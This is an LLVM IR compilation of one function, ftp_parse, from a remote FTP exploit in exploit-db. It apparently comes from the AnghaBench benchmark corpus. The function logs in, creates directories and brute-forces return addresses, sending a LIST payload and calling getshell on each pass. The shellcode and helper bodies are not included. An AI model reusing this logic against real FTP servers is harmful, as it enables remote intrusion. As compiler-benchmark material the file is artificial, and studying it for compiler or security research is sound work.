; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_88.c_ftp_parse.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_88.c_ftp_parse.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [10 x i8] c"USER %s\0D\0A\00", align 1
@user = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [10 x i8] c"PASS %s\0D\0A\00", align 1
@pass = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [9 x i8] c"CWD %s\0D\0A\00", align 1
@writedir = common dso_local global i32 0, align 4
@basedir = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [9 x i8] c"MKD %s\0D\0A\00", align 1
@attempts = common dso_local global i32 0, align 4
@reverse = common dso_local global i64 0, align 8
@baseaddr = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [73 x i8] c"[!] brute address contains null-byte/CR, increasing offset by one byte.\0A\00", align 1
@.str.5 = private unnamed_addr constant [11 x i8] c"LIST -%s\0D\0A\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"RMD %s\0D\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @ftp_parse(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  store i32 0, i32* %3, align 4
  %4 = load i32, i32* %2, align 4
  %5 = call i32 @ftp_read(i32 %4)
  %6 = load i32, i32* %2, align 4
  %7 = load i32, i32* @user, align 4
  %8 = call i32 @ftp_printf(i32 %6, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str, i64 0, i64 0), i32 %7)
  %9 = load i32, i32* %2, align 4
  %10 = call i32 @ftp_read(i32 %9)
  %11 = load i32, i32* %2, align 4
  %12 = load i32, i32* @pass, align 4
  %13 = call i32 @ftp_printf(i32 %11, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.1, i64 0, i64 0), i32 %12)
  %14 = load i32, i32* %2, align 4
  %15 = call i32 @ftp_read(i32 %14)
  %16 = load i32, i32* %2, align 4
  %17 = load i32, i32* @writedir, align 4
  %18 = call i32 @ftp_printf(i32 %16, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.2, i64 0, i64 0), i32 %17)
  %19 = load i32, i32* %2, align 4
  %20 = call i32 @ftp_read(i32 %19)
  %21 = call i32 (...) @getbdir()
  store i32 %21, i32* @basedir, align 4
  %22 = load i32, i32* %2, align 4
  %23 = load i32, i32* @basedir, align 4
  %24 = call i32 @ftp_printf(i32 %22, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.3, i64 0, i64 0), i32 %23)
  %25 = load i32, i32* %2, align 4
  %26 = call i32 @ftp_read(i32 %25)
  %27 = load i32, i32* %2, align 4
  %28 = load i32, i32* @basedir, align 4
  %29 = call i32 @ftp_printf(i32 %27, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.2, i64 0, i64 0), i32 %28)
  %30 = load i32, i32* %2, align 4
  %31 = call i32 @ftp_read(i32 %30)
  br label %32

32:                                               ; preds = %77, %1
  %33 = load i32, i32* %3, align 4
  %34 = load i32, i32* @attempts, align 4
  %35 = mul nsw i32 %34, 400
  %36 = icmp ult i32 %33, %35
  br i1 %36, label %37, label %100

37:                                               ; preds = %32
  %38 = load i64, i64* @reverse, align 8
  %39 = icmp ne i64 %38, 0
  br i1 %39, label %46, label %40

40:                                               ; preds = %37
  %41 = load i32, i32* @baseaddr, align 4
  %42 = load i32, i32* %3, align 4
  %43 = sub i32 %41, %42
  %44 = and i32 %43, 255
  %45 = icmp ne i32 %44, 0
  br i1 %45, label %46, label %73

46:                                               ; preds = %40, %37
  %47 = load i64, i64* @reverse, align 8
  %48 = icmp ne i64 %47, 0
  br i1 %48, label %49, label %55

49:                                               ; preds = %46
  %50 = load i32, i32* @baseaddr, align 4
  %51 = load i32, i32* %3, align 4
  %52 = add i32 %50, %51
  %53 = and i32 %52, 255
  %54 = icmp ne i32 %53, 0
  br i1 %54, label %55, label %73

55:                                               ; preds = %49, %46
  %56 = load i64, i64* @reverse, align 8
  %57 = icmp ne i64 %56, 0
  br i1 %57, label %64, label %58

58:                                               ; preds = %55
  %59 = load i32, i32* @baseaddr, align 4
  %60 = load i32, i32* %3, align 4
  %61 = sub i32 %59, %60
  %62 = and i32 %61, 255
  %63 = icmp eq i32 %62, 10
  br i1 %63, label %73, label %64

64:                                               ; preds = %58, %55
  %65 = load i64, i64* @reverse, align 8
  %66 = icmp ne i64 %65, 0
  br i1 %66, label %67, label %77

67:                                               ; preds = %64
  %68 = load i32, i32* @baseaddr, align 4
  %69 = load i32, i32* %3, align 4
  %70 = add i32 %68, %69
  %71 = and i32 %70, 255
  %72 = icmp eq i32 %71, 10
  br i1 %72, label %73, label %77

73:                                               ; preds = %67, %58, %49, %40
  %74 = call i32 @printf(i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.4, i64 0, i64 0))
  %75 = load i32, i32* %3, align 4
  %76 = add i32 %75, 1
  store i32 %76, i32* %3, align 4
  br label %77

77:                                               ; preds = %73, %67, %64
  %78 = load i32, i32* %2, align 4
  %79 = load i32, i32* %3, align 4
  %80 = call i32 @getdir(i32 %79)
  %81 = call i32 @ftp_printf(i32 %78, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.3, i64 0, i64 0), i32 %80)
  %82 = load i32, i32* %2, align 4
  %83 = call i32 @ftp_read(i32 %82)
  %84 = call i32 @sleep(i32 1)
  %85 = load i32, i32* %2, align 4
  %86 = call i32 (...) @getcode()
  %87 = call i32 @ftp_printf(i32 %85, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.5, i64 0, i64 0), i32 %86)
  %88 = call i32 @sleep(i32 1)
  %89 = load i32, i32* %2, align 4
  %90 = load i32, i32* %3, align 4
  %91 = call i32 @getdir(i32 %90)
  %92 = call i32 @ftp_printf(i32 %89, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i64 0, i64 0), i32 %91)
  %93 = load i32, i32* %2, align 4
  %94 = call i32 @ftp_read(i32 %93)
  %95 = load i32, i32* %2, align 4
  %96 = load i32, i32* %3, align 4
  %97 = call i32 @getshell(i32 %95, i32 %96)
  %98 = load i32, i32* %3, align 4
  %99 = add i32 %98, 400
  store i32 %99, i32* %3, align 4
  br label %32

100:                                              ; preds = %32
  %101 = load i32, i32* %2, align 4
  %102 = call i32 @ftp_clean(i32 %101)
  %103 = load i32, i32* %2, align 4
  %104 = call i32 @close(i32 %103)
  ret void
}

declare dso_local i32 @ftp_read(i32) #1

declare dso_local i32 @ftp_printf(i32, i8*, i32) #1

declare dso_local i32 @getbdir(...) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @getdir(i32) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @getcode(...) #1

declare dso_local i32 @getshell(i32, i32) #1

declare dso_local i32 @ftp_clean(i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
